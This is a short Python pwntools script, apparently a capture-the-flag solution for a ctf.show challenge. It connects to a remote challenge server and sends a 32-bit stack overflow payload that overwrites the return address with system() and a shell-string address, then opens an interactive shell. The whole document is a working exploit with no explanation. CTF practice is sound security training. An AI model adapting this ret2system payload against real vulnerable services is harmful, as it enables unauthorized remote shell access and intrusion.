from pwn import *
context.log_level = 'debug'
io = remote('pwn.challenge.ctf.show',28166)
elf = ELF('./pwn(2)')
system = elf.symbols['system']
sh = 0x080487BA
payload = b'a'*(0x12+4)+p32(system)+p32(0)+p32(sh)
io.sendline(payload)
io.recv()
io.interactive()